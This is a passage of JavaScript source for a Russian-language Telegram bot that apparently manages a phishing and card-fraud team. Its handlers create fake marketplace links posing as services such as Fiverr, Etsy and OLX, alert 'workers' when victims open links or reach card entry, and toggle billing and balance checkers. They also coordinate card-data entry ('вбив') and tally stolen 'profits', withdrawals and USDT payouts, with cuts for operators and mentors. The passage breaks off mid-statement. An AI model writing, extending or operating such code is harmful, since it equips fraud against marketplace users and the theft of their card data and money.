// ✅ Завершить прозвон
bot.action(/^call_finish_(\d+)$/, async (ctx) => {
  try {
    const adId = ctx.match[1];
    const username = ctx.from.username ? `@${ctx.from.username}` : `ID ${ctx.from.id}`;
    const userId = ctx.from.id;

    const ad = await Ad.findOne({
      where: { id: adId },
      include: ["user", "service"],
    });

    if (!ad) {
      return await ctx.answerCbQuery("❌ Объявление не найдено", { show_alert: true });
    }

    const adTitle = ad.title || "Без названия";
    const service = ad.service.title;

    await ctx.editMessageReplyMarkup(
      Markup.inlineKeyboard([
        [Markup.callbackButton(`✅ Прозвон завершён: ${username}`, "noop")],
      ])
    );

    await ctx.answerCbQuery("✅ Прозвон завершён");

    // Уведомление воркеру
    if (ad.userId && ad.userId !== userId) {
      await ctx.telegram.sendMessage(
        ad.userId,
        `✅ <b>${username}</b> завершил прозвон по вашему объявлению:\n\n🏷 <b>${adTitle}</b>\n📦 Сервис: <b>${service}</b>`,
        { parse_mode: "HTML" }
      );
    }

    // Уведомление оператору
    const operatorId = ad.user.operator;
    if (operatorId && Number(operatorId) !== Number(userId)) {
      await ctx.telegram.sendMessage(
        operatorId,
        `✅ <b>${username}</b> завершил прозвон по объявлению #id${ad.id}:\n\n🏷 <b>${adTitle}</b>\n📦 Сервис: <b>${service}</b>`,
        { parse_mode: "HTML" }
      );
    }
  } catch (err) {
    console.error("Ошибка при завершении прозвона:", err);
    await ctx.answerCbQuery("❌ Ошибка", { show_alert: true });
  }
});

bot.action(/^card_(on|off)$/, async (ctx) => {
  try {
    const newValue = ctx.match[1] === "on";
    await ctx.state.user.update({ card: newValue });

    await ctx.answerCbQuery(
      `✅ Отображение переходов на ввод карты ${newValue ? "включено" : "отключено"}.`
    ).catch((err) => err);

    return notifications(ctx);
  } catch (err) {
    return ctx.reply("❌ Произошла ошибка.").catch((err) => err);
  }
});


bot.action(/^perehod_(on|off)$/, async (ctx) => {
  try {
    const newValue = ctx.match[1] === "on";
    await ctx.state.user.update({ perehod: newValue });

    await ctx.answerCbQuery(
      `✅ Переходы по ссылке теперь ${newValue ? "отображаются" : "скрыты"}.`
    ).catch((err) => err);

    return notifications(ctx);
  } catch (err) {
    return ctx.reply("❌ Произошла ошибка.").catch((err) => err);
  }
});
bot.action(/^autotp_(on|off)$/, async (ctx) => {
  try {
    const newValue = ctx.match[1] === "on";
    await ctx.state.user.update({ autotp: newValue });

    await ctx.answerCbQuery(
      `✅ Уведомления о просмотре Авто-ТП теперь ${newValue ? "включены" : "отключены"}.`
    ).catch((err) => err);

    return notifications(ctx); // Перерисовываем клавиатуру
  } catch (err) {
    return ctx.reply("❌ Произошла ошибка.").catch((err) => err);
  }
});

bot.action(/^settings_nickname_(show|hide)$/, async (ctx) => {
  try {
    await ctx.state.user.update({
      hideNick: ctx.match[1] == "hide",
    });

    await ctx
      .answerCbQuery(
        "✅ Теперь ваш никнейм будет " +
        (ctx.state.user.hideNick ? "скрываться" : "показываться")
      )
      .catch((err) => err);

    return settings(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
bot.action(/^settings_service_(show|hide)$/, async (ctx) => {
  try {
    await ctx.state.user.update({
      hideService: ctx.match[1] == "hide" ? true : false,
    });

    await ctx
      .answerCbQuery(
        "✅ Теперь сервис будет " +
        (ctx.match[1] == "hide" ? "скрываться" : "показываться")
      )
      .catch((err) => err);

    return settings(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^my_ad_(\w+)_turn_(on|off)_balanceChecker$/, async (ctx) => {
  try {
    const ad = await Ad.findOne({
      where: {
        id: ctx.match[1],
        userId: ctx.from.id,
      },
    });
    if (!ad)
      return ctx
        .replyOrEdit("❌ Объявление не найдено", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("◀️ Назад", "my_ads_1")],
          ]),
        })
        .catch((err) => err);
    await ad.update({
      balanceChecker: ctx.match[2] == "on",
    });
    log(
      ctx,
      `${ad.balanceChecker ? "включил" : "выключил"
      } чекер баланса для объявления <code>(ID: ${ad.id})</code>`
    );
    return myAd(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
bot.action(/^my_ad_(\w+)_turn_(on|off)_billing$/, async (ctx) => {
  try {
    const ad = await Ad.findOne({
      where: {
        id: ctx.match[1],
        userId: ctx.from.id,
      },
      include: [
        {
          association: "service",
          required: true,
          include: [{ association: "country", required: true }],
        },
      ],
    });

    if (!ad)
      return ctx
        .replyOrEdit("❌ Объявление не найдено", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("◀️ Назад", "my_ads_1")],
          ]),
        })
        .catch((err) => err);

    await ad.update({
      billing: ctx.match[2] == "on",
    });

    log(
      ctx,
      `${ad.billing ? "включил" : "выключил"
      } биллинг для объявления <code>(ID: ${ad.id})</code>`
    );

    return myAd(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
bot.action(/^my_ad_(\w+)_edit_title$/, (ctx) =>
  ctx.scene.enter("my_ad_edit_title", {
    adId: ctx.match[1],
  })
);

bot.action(/^my_ad_(\w+)_edit_price$/, (ctx) =>
  ctx.scene.enter("my_ad_edit_price", {
    adId: ctx.match[1],
  })
);

bot.action(/^my_ad_(\w+)_edit_name$/, (ctx) =>
  ctx.scene.enter("my_ad_edit_name", {
    adId: ctx.match[1],
  })
);
bot.action(/^my_ad_(\w+)_edit_address$/, (ctx) =>
  ctx.scene.enter("my_ad_edit_address", {
    adId: ctx.match[1],
  })
);
// Начальный обработчик для показа подтверждения
bot.action(/^delete_ad1_(\w+)$/, async (ctx) => {
  try {
    const adId = ctx.match[1];
    const callerId = Number(ctx.from.id);

    const ad = await Ad.findOne({
      where: { id: adId },
    });

    if (!ad) {
      return ctx.answerCbQuery("Объявление не найдено", true);
    }

    // Если вызывающий не является владельцем объявления (воркером)
    if (Number(ad.userId) !== callerId) {
      // Тогда проверяем, что вызывающий является оператором этого воркера
      const worker = await User.findOne({ where: { id: ad.userId } });
      if (!worker || Number(worker.operator) !== callerId) {
        return ctx.answerCbQuery(
          "❌ Вы не являетесь оператором этого воркера",
          true
        );
      }
    }

    await ctx
      .replyWithHTML(
        `Вы уверены, что хотите удалить объявление <code>(ID: ${ad.id})</code>?`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Да", `confirm_delete_${ad.id}`)],
            [Markup.callbackButton("Нет", `cancel_delete_${ad.id}`)],
          ]),
        }
      )
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

// Обработчик для подтверждения удаления
bot.action(/^confirm_delete_(\w+)$/, async (ctx) => {
  try {
    const adId = ctx.match[1];
    const ad = await Ad.findOne({
      where: {
        id: adId,
        userId: ctx.from.id,
      },
    });

    if (ad && (await ad.destroy())) {
      log(ctx, `удалил объявление <code>(ID: ${ad.id})</code>`);
      await ctx
        .answerCbQuery("✅ Объявление удалено", true)
        .catch((err) => err);
      await ctx.deleteMessage().catch((err) => err);
    } else {
      await ctx
        .answerCbQuery("Объявление не найдено", true)
        .catch((err) => err);
    }
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
bot.action("cancel_delete_all_ads", async (ctx) => {
  try {
    await myAds(ctx);

    // await ctx.answerCbQuery("❌ Удаление отменено",true).catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^cancel_delete_(\w+)$/, async (ctx) => {
  try {
    await ctx.deleteMessage().catch((err) => err);

    await ctx.answerCbQuery("Удаление отменено", true).catch((err) => err);
    // return myAds(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^delete_ad_(\w+)$/, async (ctx) => {
  try {
    const ad = await Ad.findOne({
      where: {
        id: ctx.match[1],
        userId: ctx.from.id,
      },
    });
    if (await ad.destroy()) {
      log(ctx, `удалил объявление <code>(ID: ${ad.id})</code>`);
      await ctx
        .answerCbQuery("✅ Объявление удалено", true)
        .catch((err) => err);
    }
    // await ctx.deleteMessage().catch((err) => err);

    return myAds(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^my_ad_(\d+)_delete1$/, async (ctx) => {
  try {
    const ad = await Ad.findOne({
      where: {
        id: ctx.match[1],
      },
    });

    // Check if the ad exists and belongs to the user
    if (!ad) {
      return ctx.reply("❌ Объявление не найдено").catch((err) => err);
    } else if (ad.userId !== ctx.from.id) {
      // If the user does not own the ad, deny the deletion
      return ctx
        .answerCbQuery("❌ Вы не можете удалить это объявление", {
          show_alert: true,
        })
        .catch((err) => err);
    }

    // Proceed to delete if the user owns the ad
    if (await ad.destroy()) {
      log(ctx, `удалил объявление <code>(ID: ${ad.id})</code>`);
      await ctx.answerCbQuery("🗑️ Объявление удалено").catch((err) => err);
    }
    await ctx.deleteMessage().catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^my_ad1_(\d+)_delete$/, async (ctx) => {
  try {
    const ad = await Ad.findOne({
      where: {
        id: ctx.match[1],
        userId: ctx.from.id,
      },
    });
    if (await ad.destroy()) {
      log(ctx, `удалил объявление <code>(ID: ${ad.id})</code>`);
      await ctx.reply("Фейк удален!", true).catch((err) => err);
    }
    return ctx.deleteMessage().catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action("delete_all_my_ads", async (ctx) => {
  try {
    // Отправка сообщения с подтверждением
    await ctx.replyOrEdit("Вы уверены, что хотите удалить все объявления?", {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Да", callback_data: "confirms_delete_all_ads" },
            { text: "Нет", callback_data: "cancel_delete_all_ads" },
          ],
        ],
      },
    });
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

// Обработчик для подтверждения удаления
bot.action("confirms_delete_all_ads", async (ctx) => {
  try {
    // Попытка удалить объявления
    const deletedCount = await Ad.destroy({
      where: {
        userId: ctx.from.id,
      },
    });

    // Проверка, были ли удалены какие-то объявления
    if (deletedCount > 0) {
      await ctx
        .answerCbQuery("🗑️ Все ваши объявления были удалены", true)
        .catch((err) => err);
      return myAds(ctx);
    } else {
      await ctx
        .answerCbQuery("❌ У вас нет объявлений для удаления", true)
        .catch((err) => err);
      return myAds(ctx);
    }
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

// Обработчик для отмены удаления

bot.action("Tegs", async (ctx) => {
  await ctx
    .answerCbQuery("❌ Ошибка установки Тега", false)
    .catch((err) => err);
});
bot.action("teachers", teachers);

bot.action(/^create_link_service_([A-Za-z0-9_]+)$/, async (ctx) => {
  try {
    if (ctx.state.bot.work == true) {
    } else {
      return ctx
        .answerCbQuery("❌ STOP WORK, ожидайте рассылки!", true)
        .catch((err) => err);
    }

    // Проверяем наличие профилей
    const profiles = await Profiles.findAll({ where: { userId: ctx.from.id } });

    if (profiles.length === 0) {
      await ctx.editMessageText(
        `⚠️ <b>Профиль не найден</b>\n\nПожалуйста, добавьте или сгенерируйте профиль, чтобы создать ссылку.`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("➕ Добавить профиль", "add_profile2")],
            [Markup.callbackButton("🎲 Генерация профиля", "generate_profile_createlink")],
            [Markup.callbackButton("◀️ Вернуться в меню", "start")],
          ]),
        }
      );
      return;
    }

    await User.update(
      {
        lastService: ctx.match[1],
      },
      {
        where: {
          id: ctx.from.id,
        },
      }
    );

    await ctx.deleteMessage();
    ctx.scene.enter(`create_link_${ctx.match[1]}`);
  } catch (err) {
    return ctx.reply("❌ Сервис не найден").catch((err) => err);
  }
});

bot.action("writers", (ctx) => writers(ctx));
bot.action("chats", (ctx) => {
  ctx
    .replyOrEdit("💭 Список чатов", {
      reply_markup: Markup.inlineKeyboard([
        [
          Markup.urlButton("💵 Залёты", ctx.state.bot.payoutsChannelLink),
          Markup.urlButton("💭 Чат", ctx.state.bot.allGroupLink),
        ],
        [Markup.callbackButton("◀️ Назад", "info")],
      ]),
    })
    .catch((err) => err);
});

bot.command("euwork", async (ctx) => {
  try {
    const username = ctx.from.username;
    const userId = ctx.from.id;

    // Проверка статуса пользователя
    if (ctx.state.user.status !== 1 && ctx.state.user.status !== 2) {
      return await ctx.replyWithHTML(
        `❌ <b>Эта команда недоступна для вашего статуса.</b>`,
        {
          reply_to_message_id: ctx.message.message_id,
        }
      );
    }

    // Проверяем есть ли запись о пользователе в Writer
    const writer = await Writer.findOne({
      where: { username },
    });

    if (writer) {
      // Если найден — удаляем (пользователь уходит со вбива)
      await Writer.destroy({
        where: { username },
      });

      await ctx.replyWithHTML(`❌ <b>Вы вышли со вбива.</b>`, {
        reply_to_message_id: ctx.message.message_id,
      });

      // Сообщение в групповой чат
      setTimeout(async () => {
        await ctx.telegram
          .sendMessage(
            ctx.state.bot.allGroupId,
            `<b>❌ @${username} покинул вбив.</b>`,
            { parse_mode: "HTML" }
          )
          .catch((err) => console.error(err));
      }, 500);
    } else {
      // Если не найден — создаём запись
      await Writer.create({
        countryCode: null,
        status: 1,
        username,
        userId, // сохраняем userId
      });

      await ctx.replyWithHTML(`✅ <b>Вы начали вбив!</b>`, {
        reply_to_message_id: ctx.message.message_id,
      });

      // Сообщение в групповой чат
      setTimeout(async () => {
        await ctx.telegram
          .sendMessage(
            ctx.state.bot.allGroupId,
            `<b>✅ @${username} начал вбив.</b>`,
            { parse_mode: "HTML" }
          )
          .catch((err) => console.error(err));
      }, 500);
    }
  } catch (err) {
    console.error(err);
    await ctx.reply("❌ Произошла ошибка").catch((err) => console.error(err));
  }
});

bot.command("admins", async (ctx) => {
  try {
    const users = await User.findAll({ where: { status: 1 } });
    if (users.length > 0) {
      const userMessages = users.map(
        (user) => `ID: ${user.id}, Name: @${user.username}`
      );
      const message = userMessages.join("\n");
      ctx.reply(message).catch((err) => console.error(err));
    } else {
      ctx.reply("Администраторы не найдены.");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Ошибка").catch((err) => console.error(err));
  }
});

bot.command("writers", async (ctx) => {
  try {
    const users = await User.findAll({ where: { status: 2 } });
    if (users.length > 0) {
      const userMessages = users.map(
        (user) => `ID: ${user.id}, Name: @${user.username}`
      );
      const message = userMessages.join("\n");
      ctx.reply(message).catch((err) => console.error(err));
    } else {
      ctx.reply("Администраторы не найдены.");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Ошибка").catch((err) => console.error(err));
  }
});

bot.action("none", async (ctx) => {
  ctx.answerCbQuery("?", true).catch((err) => err);
});
bot.action("booking", async (ctx) => {
  return ctx.scene.enter("booking");
});
bot.action("createFileLink", async (ctx) => {
  return ctx.scene.enter("createFile");
});

bot.action("createFileLink2", async (ctx) => {
  return ctx.scene.enter("createFile2");
});

bot.action("createFileLink3", async (ctx) => {
  return ctx.scene.enter("createFile3");
});
bot.action("createFileLinkAtomOlx", async (ctx) => {
  return ctx.scene.enter("createFileLinkAtomOlx");
});

bot.action("fiverr_atom_parser", async (ctx) => {
  return ctx.scene.enter("fiverr_atom_parser");
});
bot.action("fiverr_verif_atom_parser", async (ctx) => {
  return ctx.scene.enter("fiverr_verif_atom_parser");
});
bot.action("etsy_atom_parser", async (ctx) => {
  return ctx.scene.enter("etsy_atom_parser");
});
bot.action("etsy_verif_atom_parser", async (ctx) => {
  return ctx.scene.enter("etsy_verif_atom_parser");
});
bot.hears(/^https:\/\/(www\.)?fiverr\.com\/.+$/, (ctx) => {
  if (ctx.chat.type === "private") {
    // Проверяем, что сообщение пришло в личные сообщения
    ctx.scene.enter("fiverr_link_handler");
  } else {
    ctx.reply("❌ Эта команда доступна только в личных сообщениях бота.");
  }
});

bot.action("referrals", async (ctx) => {
  try {
    const userId = ctx.from.id;

    // Загружаем рефералов
    const referrals = await Referral.findAll({ where: { referrerId: userId } });
    const referralCount = referrals.length;
    const totalProfits = referrals.reduce(
      (sum, referral) => sum + parseFloat(referral.profitAmount),
      0
    );
    const totalUSDT = totalProfits.toFixed(2);

    // Получаем процент из настроек
    const settings = await ctx.state.bot; // если ctx.state.bot уже загружен
    const referralPercent = settings.referralPercent || 1; // fallback

    const referralLink = `https://t.me/${process.env.BOT_USERNAME}?start=${userId}`;
    const messageText = `🎁 <b>Реферальная система</b>

🔗 Ваша ссылка для приглашения: 
<code>${referralLink}</code>

📨 Приглашено пользователей: <b>${referralCount}</b>
💰 Общая сумма профитов ваших рефералов: <b>${totalUSDT} USDT</b>

💸 Вы получаете <b>${parseFloat(referralPercent).toFixed(2)}%</b> от каждого профита приглашённых пользователей.

<i>Поделитесь ссылкой и зарабатывайте вместе с командой!</i>`;

    const keyboard = Markup.inlineKeyboard([
      [
        Markup.urlButton(
          "🗣️ Поделиться ссылкой",
          `https://t.me/share/url?url=${encodeURIComponent(
            referralLink
          )}&text=${encodeURIComponent(
            "Присоединяйтесь к боту по моей реферальной ссылке!"
          )}`
        ),
      ],
      [Markup.callbackButton("👥 Список рефералов", "show_referral_list")],
      [Markup.callbackButton("◀️ Назад", "settings")],
    ]);

    if (ctx.replyOrEdit) {
      await ctx.replyOrEdit(messageText, {
        parse_mode: "HTML",
        reply_markup: keyboard,
      });
    } else {
      await ctx.reply(messageText, {
        parse_mode: "HTML",
        reply_markup: keyboard,
      });
    }
  } catch (error) {
    console.error(error);
    ctx.reply(
      "Произошла ошибка при обработке вашего запроса. Пожалуйста, попробуйте позже."
    );
  }
});


// Обработчик для показа списка рефералов

bot.action("show_referral_list", async (ctx) => {
  try {
    const userId = ctx.from.id;
    const referrals = await Referral.findAll({ where: { referrerId: userId } });

    if (referrals.length === 0) {
      await ctx
        .answerCbQuery("У вас пока нет рефералов", true)
        .catch((err) => err);
      return;
    }

    const referralList = await Promise.all(
      referrals.map(async (referral, index) => {
        const user = await User.findOne({ where: { id: referral.userId } });
        const username =
          user && user.username ? `@${user.username}` : "Без имени";
        const profit = parseFloat(referral.profitAmount || 0).toFixed(2);
        return `${index + 1}. ${username} - Профит: ${profit} USDT`;
      })
    );

    const messageText = `${referralList.join("\n")}`;

    await ctx.replyOrEdit(messageText, {
      parse_mode: "HTML",
      reply_markup: Markup.inlineKeyboard([
      [Markup.callbackButton("◀️ Назад", "referrals")],
      ]),
    });
  } catch (error) {
    console.error(error);
    ctx.reply(
      "Произошла ошибка при загрузке списка рефералов. Пожалуйста, попробуйте позже."
    );
  }
});
bot.action("search_by_id", async (ctx) => {
  ctx.scene.enter("searchAdById"); // Переключаемся на сцену поиска по ID
});

bot.action("info", async (ctx) => {
  const stats = {
    users: await User.count(),
    profits: await Profit.count(),
    profits_payed_sum: await Profit.sum("amount", {
      where: {
        status: 1,
      },
    }),
  };

  ctx.answerCbQuery("Загружаю...   ").catch((err) => err);

  ctx
    .replyOrEdit(
      `
👤 Администратор: <b>@grower_cvv</b>

⌨️ Разработчик: <b>@haron</b>
🔗 Доменщик: <b>@nireusjs</b>

👥 Всего воркеров: <b>${stats.users.toLocaleString()}</b>
💵 Всего профитов: <b>${stats.profits.toLocaleString()}</b>
✅ Всего выплачено: <b>${parseFloat(stats.profits_payed_sum || 0).toFixed(2)} USD</b>
    `,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.urlButton("💬 Чат воркеров", ctx.state.bot.allGroupLink),
            Markup.urlButton(
              "📢 Канал выплат",
              ctx.state.bot.payoutsChannelLink
            ),
          ],
          [Markup.callbackButton("📜 Правила проекта", "pravila")],
          [Markup.callbackButton("◀️ В главное меню", "start")],
        ]),
      }
    )
    .catch((err) => err);
});

bot.action("help_work", async (ctx) => {
  ctx.replyOrEdit(
    `💻 Вы можете выбрать <b>оператора</b> или <b>наставника</b> для получения помощи и сопровождения до момента получения профита.

<b>Учтите:</b> <i>С каждого профита автоматически удерживается процент в пользу выбранного помощника.</i>`,
    {
      parse_mode: "HTML",
      reply_markup: Markup.inlineKeyboard([
        [
          Markup.callbackButton("👨🏼‍💻 Операторы", "supports"),
          Markup.callbackButton(locale.mainMenu.buttons.teachers, "teachers"),
        ],
        [Markup.callbackButton("◀️ В главное меню", "start")],
      ]),
    }
  );
});

bot.action("pravila", (ctx) => {
  try {
    const settings = ctx.state.bot;
    ctx.answerCbQuery("Загружаю правила..  ").catch((err) => err);

    ctx.replyOrEdit(
      `
     ${settings.info == null ? `Правил пока нет` : settings.info}`,
      {
        parse_mode: "HTML",
        disable_web_page_preview: true,
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton(`◀️ Назад`, `info`)],
        ]),
      }
    );
  } catch (err) {
    console.log(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action("change_trc", wallet);


bot.action(`refuse_mentor`, async (ctx) => {
  try {
    const user = await User.findOne({ where: { id: ctx.from.id } });

    const mentor = await Nastavniki.findOne({
      where: { id: user.mentor },
    });

    // Пытаемся отправить сообщение наставнику
    try {
      await ctx.telegram.sendMessage(
        mentor.id,
        `<b>❌ Ученик @${ctx.from.username} отказался от вас</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.urlButton(
                `💬 Связаться с учеником`,
                `https://t.me/${ctx.from.username}`
              ),
            ],
          ]),
        }
      );
    } catch (err) {
      // Ошибка логируется, но выполнение продолжается
    }

    // Обновляем информацию о наставнике для пользователя
    await User.update({ mentor: null }, { where: { id: ctx.from.id } });

    await User.update({ requestMentor: 0 }, { where: { id: ctx.from.id } });

    // Возвращаемся к меню наставников
    return teachers(ctx);
  } catch (err) {
    console.log(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(`refuse_operator`, async (ctx) => {
  try {
    const user = await User.findOne({ where: { id: ctx.from.id } });
    const operator = await Operators.findOne({
      where: { userId: user.operator },
    });

    // Пытаемся отправить сообщение оператору
    try {
      await ctx.telegram.sendMessage(
        operator.userId,
        `<b>❌ Воркер @${ctx.from.username} отказался от вас</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.urlButton(
                `💬 Связаться с воркером`,
                `https://t.me/${ctx.from.username}`
              ),
            ],
          ]),
        }
      );
    } catch (err) {
      // Здесь можно записать ошибку в лог или просто продолжить выполнение
    }

    // Обновление данных воркера для отказа от оператора
    await User.update({ operator: null }, { where: { id: ctx.from.id } });

    await User.update({ requestOperator: 0 }, { where: { id: ctx.from.id } });

    await ctx
      .answerCbQuery(
        `✅ Вы успешно отказались от своего оператора, можете выбрать нового.`
      )
      .catch((err) => err);

    // Возвращаемся к меню поддержки или другой сцены
    return supports(ctx);
  } catch (err) {
    console.log(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action("mailer", async (ctx) => {
  return ctx.scene.enter("mailer");
});

bot.command("vbiv", writers);

bot.command("me", menume);
bot.hears("Меню", async (ctx) => {
  if (ctx.chat.type === "private") {
    // Вызов функции menu, если сообщение из личного чата с ботом
    await menu(ctx);
  } else {
    // Игнорируем команду, если сообщение не из личного чата с ботом
    await ctx.replyWithHTML(
      "<b>⚠️ Команда доступна только при использовании в личной переписке с ботом.</b>",
      { reply_to_message_id: ctx.message.message_id }
    );
  }
});
bot.command("status", async (ctx) => {
  ctx.replyWithHTML(
    `<b>${ctx.state.bot.work == true
      ? "✅ Проект работает, можно заводить."
      : "❌ Проект на стопе, заводить пока нельзя."
    }</b>`
  );
});

bot.action("change_tag", async (ctx) => {
  return ctx.scene.enter("change_tag");
});

bot.command("btc", async (ctx) => {
  try {
    const url = "https://blockchain.info/ticker";
    const response = await axios.get(url);
    const data = response.data;

    const message = `<b>🪙 Bitcoin:</b>\n
💵 ${data.USD.last} <b>USD</b>
💶 ${data.EUR.last} <b>EUR</b>
💴 ${data.RUB.last} <b>RUB</b>`;

    await ctx.replyWithHTML(message);
  } catch (error) {
    console.error("Ошибка при получении курса BTC:", error.message);
    await ctx.reply("❌ Не удалось получить курс биткоина. Попробуйте позже.");
  }
});

bot.action("workers_top", workersTop);
bot.action("workers_top1", workersTop1);

// bot.hears(/Топ|Топ воркеров|Топ профитов/giu, workersTop);
bot.command("top", workersTop);

function pluralize(count, one, few, many) {
  const mod10 = count % 10;
  const mod100 = count % 100;

  if (mod10 === 1 && mod100 !== 11) return one;
  if (mod10 >= 2 && mod10 <= 4 && (mod100 < 10 || mod100 >= 20)) return few;
  return many;
}

bot.command("kassa", async (ctx) => {
  try {
    const yesterdayStart = moment().subtract(1, "days").startOf("day").toDate();
    const yesterdayEnd = moment().subtract(1, "days").endOf("day").toDate();

    // Касса и количество профитов за вчера
    const kassa_yesterday = await Profit.sum("Amount", {
      where: {
        createdAt: {
          [Op.between]: [yesterdayStart, yesterdayEnd],
        },
      },
    });
    const profitCountYesterday = await Profit.count({
      where: {
        createdAt: {
          [Op.between]: [yesterdayStart, yesterdayEnd],
        },
      },
    });

    // Касса и количество профитов за всё время
    const kassa = await Profit.sum("Amount");
    const totalProfitCount = await Profit.count();

    // Касса и количество профитов за сегодня
    const kassa_today = await Profit.sum("Amount", {
      where: {
        createdAt: {
          [Op.gte]: moment().startOf("day").toDate(),
        },
      },
    });
    const profitCountToday = await Profit.count({
      where: {
        createdAt: {
          [Op.gte]: moment().startOf("day").toDate(),
        },
      },
    });

    // Касса и количество профитов за месяц
    const kassa_month = await Profit.sum("Amount", {
      where: {
        createdAt: {
          [Op.gte]: moment().startOf("month").toDate(),
        },
      },
    });
    const profitCountMonth = await Profit.count({
      where: {
        createdAt: {
          [Op.gte]: moment().startOf("month").toDate(),
        },
      },
    });

    // Лучший ежедневный результат за все время
    const bestDailyResult = await Profit.findAll({
      attributes: [
        [Sequelize.fn("date", Sequelize.col("createdAt")), "date"],
        [Sequelize.fn("sum", Sequelize.col("Amount")), "totalAmount"],
        [Sequelize.fn("count", Sequelize.col("id")), "totalCount"], // Подсчет количества профитов
      ],
      group: ["date"],
      order: [[Sequelize.fn("sum", Sequelize.col("Amount")), "DESC"]],
      limit: 1,
    });

    const bestResultDate =
      bestDailyResult.length > 0
        ? moment(bestDailyResult[0].get("date")).format("DD.MM.YYYY")
        : "N/A";
    const bestResultAmount =
      bestDailyResult.length > 0
        ? parseFloat(bestDailyResult[0].get("totalAmount")).toFixed(2)
        : "N/A";
    const bestResultCount =
      bestDailyResult.length > 0 ? bestDailyResult[0].get("totalCount") : "N/A";

    const todayWord = pluralize(profitCountToday, "снятие", "снятия", "снятий");
    const yesterdayWord = pluralize(
      profitCountYesterday,
      "снятие",
      "снятия",
      "снятий"
    );
    const monthWord = pluralize(profitCountMonth, "снятие", "снятия", "снятий");
    const totalWord = pluralize(totalProfitCount, "снятие", "снятия", "снятий");
    const bestWord = pluralize(bestResultCount, "снятие", "снятия", "снятий");

    return ctx.replyOrEdit(
      `🚀 <b>Касса проекта</b>

Сегодня: <b>${parseFloat(kassa_today).toFixed(
        2
      )} USD</b> (<b>${profitCountToday}</b> ${todayWord})
Вчера: <b>${parseFloat(kassa_yesterday).toFixed(
        2
      )} USD</b> (<b>${profitCountYesterday}</b> ${yesterdayWord})
За месяц: <b>${parseFloat(kassa_month).toFixed(
        2
      )} USD</b> (<b>${profitCountMonth}</b> ${monthWord})
Всего: <b>${parseFloat(kassa).toFixed(
        2
      )} USD</b> (<b>${totalProfitCount}</b> ${totalWord})

Максимум за день: <b>${bestResultAmount} USD</b> (<b>${bestResultCount}</b> ${bestWord})
Дата рекорда: <b>${bestResultDate}</b>`,
      {
        reply_markup: Markup.inlineKeyboard([
          Markup.callbackButton("🏆 Топ", "workers_top"),
          Markup.callbackButton("❌ Скрыть", "delete"),
        ]),
        parse_mode: "HTML",
      }
    );
  } catch (err) {
    console.log(err);
    return ctx.reply("❌ Ошибка ").catch(handleError);
  }
});

// Добавляем переменную для отслеживания рекорда

bot.action("kassa", async (ctx) => {
  try {
    const yesterdayStart = moment().subtract(1, "days").startOf("day").toDate();
    const yesterdayEnd = moment().subtract(1, "days").endOf("day").toDate();

    // Касса и количество профитов за вчера
    const kassa_yesterday = await Profit.sum("Amount", {
      where: {
        createdAt: {
          [Op.between]: [yesterdayStart, yesterdayEnd],
        },
      },
    });
    const profitCountYesterday = await Profit.count({
      where: {
        createdAt: {
          [Op.between]: [yesterdayStart, yesterdayEnd],
        },
      },
    });

    // Касса и количество профитов за всё время
    const kassa = await Profit.sum("Amount");
    const totalProfitCount = await Profit.count();

    // Касса и количество профитов за сегодня
    const kassa_today = await Profit.sum("Amount", {
      where: {
        createdAt: {
          [Op.gte]: moment().startOf("day").toDate(),
        },
      },
    });
    const profitCountToday = await Profit.count({
      where: {
        createdAt: {
          [Op.gte]: moment().startOf("day").toDate(),
        },
      },
    });

    // Касса и количество профитов за месяц
    const kassa_month = await Profit.sum("Amount", {
      where: {
        createdAt: {
          [Op.gte]: moment().startOf("month").toDate(),
        },
      },
    });
    const profitCountMonth = await Profit.count({
      where: {
        createdAt: {
          [Op.gte]: moment().startOf("month").toDate(),
        },
      },
    });

    // Лучший ежедневный результат за все время
    const bestDailyResult = await Profit.findAll({
      attributes: [
        [Sequelize.fn("date", Sequelize.col("createdAt")), "date"],
        [Sequelize.fn("sum", Sequelize.col("Amount")), "totalAmount"],
        [Sequelize.fn("count", Sequelize.col("id")), "totalCount"], // Подсчет количества профитов
      ],
      group: ["date"],
      order: [[Sequelize.fn("sum", Sequelize.col("Amount")), "DESC"]],
      limit: 1,
    });

    const bestResultDate =
      bestDailyResult.length > 0
        ? moment(bestDailyResult[0].get("date")).format("DD.MM.YYYY")
        : "N/A";
    const bestResultAmount =
